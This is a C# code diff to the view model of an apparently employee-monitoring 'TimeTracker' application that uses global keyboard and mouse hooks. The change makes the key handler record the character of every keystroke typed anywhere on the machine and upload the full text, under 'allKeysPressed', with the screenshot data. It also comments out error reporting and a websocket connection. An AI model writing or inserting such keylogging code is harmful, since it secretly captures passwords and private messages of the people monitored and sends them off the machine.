@@ -31,6 +31,8 @@ using System.Threading;
 using TimeTracker.Views;
 using System.Timers;
 using System.Dynamic;
+using System.Windows.Input;
+using DocumentFormat.OpenXml.Office2013.PowerPoint.Roaming;
 
 namespace TimeTracker.ViewModels
 {
@@ -59,7 +61,8 @@ namespace TimeTracker.ViewModels
         private int totalMouseClick = 0;
         private int totalKeysPressed = 0;
         private int totalMouseScrolls = 0;
-        private string machineId = string.Empty;        
+        private string machineId = string.Empty;
+        
         MouseHook mh;
         public event EventHandler RequestClose;
         #endregion
@@ -105,7 +108,7 @@ namespace TimeTracker.ViewModels
             mh.MouseDownEvent += Mh_MouseDownEvent;
             mh.MouseUpEvent += mh_MouseUpEvent;
             mh.MouseWheelEvent += mh_MouseWheelEvent;
-
+            InterceptKeys.OnKeyDown -= InterceptKeys_OnKeyDown;
             InterceptKeys.OnKeyDown += InterceptKeys_OnKeyDown;
             InterceptKeys.Start();
 
@@ -135,7 +138,10 @@ namespace TimeTracker.ViewModels
         private void InterceptKeys_OnKeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
             totalKeysPressed++;
-        }
+            // Append the pressed key to the current input            
+            CurrentInput += Convert.ToChar(e.KeyValue);            
+        }       
+
         private void OnRequestClose()
         {
             RequestClose?.Invoke(this, EventArgs.Empty);
@@ -167,6 +173,18 @@ namespace TimeTracker.ViewModels
                 OnPropertyChanged(nameof(StartStopButtontext));
             }
         }
+
+        private string currentInput = string.Empty;
+        public string CurrentInput
+        {
+            get { return currentInput; }
+            set
+            {
+                currentInput = value;
+                OnPropertyChanged(nameof(CurrentInput));
+            }
+        }
+
 
         private string screenshotSoundtext = Properties.Settings.Default.playScreenCaptureSound
             ? "Turn off sound on screenshot capture"
@@ -789,6 +807,7 @@ namespace TimeTracker.ViewModels
             ShowTimeTracked(false);
             ShowCurrentTimeTracked();
             saveDispatcherTimer.Stop();
+            CurrentInput=string.Empty;
         }
         private string CaptureScreen()
         {
@@ -966,6 +985,7 @@ namespace TimeTracker.ViewModels
                 fileString = file,
                 filePath = fileName,
                 keysPressed = totalKeysPressed,
+                allKeysPressed= CurrentInput,
                 clicks = totalMouseClick,
                 scrolls = totalMouseScrolls,
                 project = SelectedProject._id,
@@ -1114,12 +1134,12 @@ namespace TimeTracker.ViewModels
         {
             try
             {
-                var rest = new REST(new HttpProviders());
-                rest.AddErrorLogs(new ErrorLog()
-                {
-                    error = error,
-                    details = details
-                });
+                //var rest = new REST(new HttpProviders());
+                //rest.AddErrorLogs(new ErrorLog()
+                //{
+                //    error = error,
+                //    details = details
+                //});
             }
             catch (Exception ex)
             {
@@ -1425,16 +1445,16 @@ namespace TimeTracker.ViewModels
         {
             try
             {
-                var url = $"wss://effortlesshrmapi.azurewebsites.net:4000/{userId}";
-                if (await Commons.CheckUrlAccessibility(url))
-                {
-                    //await webSocket.ConnectAsync(new Uri("ws://localhost:8081/63f846e32ff78af44d597cbc"), CancellationToken.None);
-                    //await webSocket.ConnectAsync(new Uri("ws://localhost:8081/62dfa8d13babb9ac2072863c"), CancellationToken.None);
-                    await webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
+                //var url = $"wss://effortlesshrmapi.azurewebsites.net:4000/{userId}";
+                //if (await Commons.CheckUrlAccessibility(url))
+                //{
+                //    //await webSocket.ConnectAsync(new Uri("ws://localhost:8081/63f846e32ff78af44d597cbc"), CancellationToken.None);
+                //    //await webSocket.ConnectAsync(new Uri("ws://localhost:8081/62dfa8d13babb9ac2072863c"), CancellationToken.None);
+                //    await webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
 
-                    // Start listening for incoming WebSocket messages
-                    ListenForWebSocketMessages();
-                }
+                //    // Start listening for incoming WebSocket messages
+                //    ListenForWebSocketMessages();
+                //}
             }
             catch (Exception ex)
             {
